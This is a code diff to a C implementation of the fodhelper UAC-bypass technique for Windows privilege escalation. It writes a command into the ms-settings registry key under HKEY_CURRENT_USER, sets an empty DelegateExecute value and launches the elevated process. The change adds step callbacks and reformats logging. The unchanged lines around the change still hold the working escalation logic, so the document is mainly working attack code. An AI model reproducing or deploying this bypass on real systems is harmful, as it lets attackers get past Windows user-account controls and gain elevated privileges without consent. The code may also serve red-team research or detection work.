@@ -9,7 +9,9 @@
 
 #pragma comment(lib, "Advapi32.lib")
 
-int FodHelperAbuseEscalationInternal(const char* execPath) {
+#define STEP(cb, name, idx) if ((cb) != NULL) (cb)(name, idx)
+
+int FodHelperAbuseEscalationInternal(const char* execPath, StepCallback callback) {
     HKEY hkey;
     DWORD d;
     const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
@@ -20,13 +22,28 @@ int FodHelperAbuseEscalationInternal(const char* execPath) {
     const char* del = "";
 
     LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
-    printf(stat != ERROR_SUCCESS ? "FAILED TO OPEN OR CREATE REG KEY\n" : "succesfully created reg key\n");
+    if (stat != ERROR_SUCCESS) {
+        printf("FAILED TO OPEN OR CREATE REG KEY\n");
+    } else {
+        printf("succesfully created reg key\n");
+        STEP(callback, "RegCreateKeyExA", 0);
+    }
 
     stat = RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE*)cmd, (DWORD)strlen(cmd) + 1);
-    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");
+    if (stat != ERROR_SUCCESS) {
+        printf("FAILED TO SET REG VALUE\n");
+    } else {
+        printf("succesfully set reg value\n");
+        STEP(callback, "RegSetValueExA", 1);
+    }
 
     stat = RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE*)del, (DWORD)strlen(del) + 1);
-    printf(stat != ERROR_SUCCESS ? "FAILED TO SET REG VALUE\n" : "succesfully set reg value\n");
+    if (stat != ERROR_SUCCESS) {
+        printf("FAILED TO SET REG VALUE\n");
+    } else {
+        printf("succesfully set reg value\n");
+        STEP(callback, "RegSetValueExA", 2);
+    }
 
     RegCloseKey(hkey);
 
@@ -40,9 +57,9 @@ int FodHelperAbuseEscalationInternal(const char* execPath) {
     if (!ShellExecuteEx(&shellExecuteInfo)) {
         DWORD error = GetLastError();
         printf(error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
-    }
-    else {
+    } else {
         printf("Successfully created the process =^..^=\n");
+        STEP(callback, "ShellExecuteEx", 3);
     }
 
     return 0;
